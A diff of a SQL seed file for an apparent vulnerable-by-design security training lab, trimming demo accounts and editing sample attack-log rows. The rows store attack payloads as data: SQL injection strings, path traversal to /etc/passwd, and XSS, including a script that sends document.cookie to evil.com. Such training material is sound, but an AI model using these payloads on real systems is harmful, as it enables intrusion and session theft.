@@ -95,18 +95,12 @@ CREATE TABLE secret_data (
 
 -- ============================================================
 -- DONNÉES DE DÉMO
--- NOTE : Les mots de passe sont hashés au démarrage par server.js
 -- ============================================================
 
--- ─── Utilisateurs ─────────────────────────────────────────────────────────────
+-- ─── Compte administrateur ────────────────────────────────────────────────────
+-- Le mot de passe 'SEED_ON_START' est remplacé par le hash bcrypt au démarrage.
 INSERT INTO users (username, password, email, role) VALUES
-('admin',            'SEED_ON_START', 'admin@seclab.local',     'admin'),
-('alice',            'SEED_ON_START', 'alice@seclab.local',     'user'),
-('bob',              'SEED_ON_START', 'bob@seclab.local',       'user'),
-('moderator',        'SEED_ON_START', 'mod@seclab.local',       'moderator'),
-('hacker_test',      'SEED_ON_START', 'hacker@seclab.local',    'user'),
-('dev_user',         'SEED_ON_START', 'dev@seclab.local',       'user'),
-('security_analyst', 'SEED_ON_START', 'analyst@seclab.local',   'moderator');
+('admin', 'SEED_ON_START', 'admin@seclab.local', 'admin');
 
 -- ─── Produits ─────────────────────────────────────────────────────────────────
 INSERT INTO products (name, category, price, description, stock, is_secret) VALUES
@@ -138,7 +132,7 @@ INSERT INTO comments (author, content, endpoint_type) VALUES
 ('Bob',     'Learned so much about SQL injection here.',              'secure'),
 ('Charlie', 'XSS vulnerabilities are more dangerous than I thought.', 'secure');
 
--- ─── Journaux d'attaques (80 entrées sur 7 jours) ────────────────────────────
+-- ─── Journaux d'attaques (données historiques pour la démonstration) ──────────
 INSERT INTO attack_logs (attack_type, payload, endpoint, ip_address, status, severity, points, created_at) VALUES
 -- Jour 7
 ('SQL_INJECTION', "' OR '1'='1",                                    '/api/auth/login-vulnerable',   '192.168.1.100', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 7 DAY)),
@@ -168,7 +162,7 @@ INSERT INTO attack_logs (attack_type, payload, endpoint, ip_address, status, sev
 ('SQL_INJECTION', '1 AND SLEEP(5)',                                  '/api/sqli/product-vulnerable', '192.168.1.104', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 4 DAY)),
 ('XSS',           '<script>new Image().src="http://evil.com/log?k="+document.cookie</script>', '/api/xss/comment-vulnerable', '10.0.0.40', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 2 HOUR),
 ('SQL_INJECTION', "admin' OR '1'='1'--",                            '/api/auth/login-vulnerable',   '172.16.0.80',   'PASSED',   'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 3 HOUR),
-('BRUTE_FORCE',   '5 failed attempts in 30 seconds: hacker_test',   '/api/brute/login-vulnerable',  '192.168.200.1', 'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 4 HOUR),
+('BRUTE_FORCE',   '5 failed attempts in 30 seconds',                '/api/brute/login-vulnerable',  '192.168.200.1', 'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 4 HOUR),
 ('XSS',           '<input autofocus onfocus=alert(1)>',             '/api/xss/reflect-vulnerable',  '10.0.0.45',     'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 6 HOUR),
 ('PATH_TRAVERSAL','%2e%2e%2fetc%2fpasswd',                           '/api/files/read-vulnerable',   '10.0.0.55',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 4 DAY) + INTERVAL 7 HOUR),
 -- Jour 3
@@ -184,12 +178,12 @@ INSERT INTO attack_logs (attack_type, payload, endpoint, ip_address, status, sev
 ('CSRF',          'Missing CSRF token on transfer action',          '/api/csrf/transfer-vulnerable', '172.16.0.100',  'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 3 HOUR),
 ('XSS',           '<object data="javascript:alert(1)">',            '/api/xss/reflect-vulnerable',  '192.168.1.108', 'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 5 HOUR),
 ('SQL_INJECTION', "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", '/api/sqli/search-vulnerable', '10.0.0.65', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 6 HOUR),
-('BRUTE_FORCE',   'Dictionary attack: 200 attempts: dev_user',      '/api/brute/login-secure',      '172.16.0.110',  'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 7 HOUR),
+('BRUTE_FORCE',   'Dictionary attack: 200 attempts',                '/api/brute/login-secure',      '172.16.0.110',  'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 7 HOUR),
 ('PATH_TRAVERSAL','../../../proc/version',                           '/api/files/read-vulnerable',   '10.0.0.77',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 2 DAY) + INTERVAL 8 HOUR),
 -- Hier
 ('SQL_INJECTION', "'; INSERT INTO users(username,password) VALUES('pwned','hacked')--", '/api/sqli/product-vulnerable', '192.168.1.109', 'BLOCKED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 1 DAY)),
 ('XSS',           '<script src="http://evil.com/xss.js"></script>', '/api/xss/comment-vulnerable',  '10.0.0.70',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 1 HOUR),
-('BRUTE_FORCE',   'Account lockout triggered: security_analyst',    '/api/brute/login-secure',      '172.16.0.110',  'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 2 HOUR),
+('BRUTE_FORCE',   'Account lockout triggered',                      '/api/brute/login-secure',      '172.16.0.110',  'BLOCKED',  'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 2 HOUR),
 ('SQL_INJECTION', "' UNION SELECT 1,data_key,data_value,4,5 FROM secret_data--", '/api/sqli/search-vulnerable', '192.168.1.110', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 4 HOUR),
 ('CSRF',          'Forged transfer: amount=99999&to=attacker',      '/api/csrf/transfer-vulnerable', '10.20.30.99',   'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 5 HOUR),
 ('PATH_TRAVERSAL','../../etc/hosts',                                 '/api/files/read-vulnerable',   '172.16.1.10',   'DETECTED', 'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 1 DAY) + INTERVAL 6 HOUR),
@@ -198,7 +192,7 @@ INSERT INTO attack_logs (attack_type, payload, endpoint, ip_address, status, sev
 ('SQL_INJECTION', "' OR '1'='1",                                    '/api/auth/login-vulnerable',   '192.168.1.112', 'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 2 HOUR)),
 ('XSS',           '<script>alert(document.cookie)</script>',        '/api/xss/comment-vulnerable',  '10.0.0.80',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 90 MINUTE)),
 ('SQL_INJECTION', "1; DROP TABLE products;--",                      '/api/sqli/product-vulnerable', '172.16.0.120',  'BLOCKED',  'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 60 MINUTE)),
-('BRUTE_FORCE',   '5 failed login attempts in 2 minutes: hacker_test', '/api/brute/login-vulnerable', '192.168.1.113', 'BLOCKED', 'MEDIUM', 20, DATE_SUB(NOW(), INTERVAL 30 MINUTE)),
+('BRUTE_FORCE',   '5 failed login attempts in 2 minutes',           '/api/brute/login-vulnerable',  '192.168.1.113', 'BLOCKED',  'MEDIUM',   20,  DATE_SUB(NOW(), INTERVAL 30 MINUTE)),
 ('PATH_TRAVERSAL','../../../../etc/passwd',                          '/api/files/read-vulnerable',   '10.0.0.90',     'DETECTED', 'CRITICAL', 100, DATE_SUB(NOW(), INTERVAL 20 MINUTE)),
 ('CSRF',          'Transfer 2500 DZD — no CSRF token',             '/api/csrf/transfer-vulnerable', '10.0.0.95',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 10 MINUTE)),
 ('XSS',           '<img src=1 href=1 onerror=javascript:alert(1)>', '/api/xss/reflect-vulnerable',  '10.0.0.85',     'DETECTED', 'HIGH',     50,  DATE_SUB(NOW(), INTERVAL 5 MINUTE)),
